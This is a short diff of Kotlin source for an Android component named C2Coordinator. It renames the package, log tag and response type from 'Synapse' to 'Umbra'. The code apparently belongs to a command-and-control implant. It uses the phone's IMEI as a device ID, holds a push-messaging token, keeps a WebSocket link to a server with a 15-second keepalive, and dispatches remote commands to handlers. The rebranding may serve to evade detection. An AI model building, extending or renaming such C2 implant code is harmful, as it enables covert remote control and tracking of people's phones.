@@ -1,14 +1,14 @@
-package org.synapse.core.c2
+package org.umbra.core.c2
 
 import android.content.Context
 import android.util.Log
-import org.synapse.core.core.CryptoEngine
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.core.CryptoEngine
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.*
 import kotlinx.serialization.json.Json
 
 object C2Coordinator {
-    private const val TAG = "Synapse.C2"
+    private const val TAG = "Umbra.C2"
     private const val KEEPALIVE_INTERVAL_MS = 15_000L  // 15 second application-level ping
 
     private var ws: WebSocketTransport? = null
@@ -23,7 +23,7 @@ object C2Coordinator {
         imei: String,
         serverUrl: String,
         token: String?,
-        handlers: Map<String, suspend (Command) -> SynapseResponse>
+        handlers: Map<String, suspend (Command) -> UmbraResponse>
     ) {
         deviceId = imei
         fcmToken = token
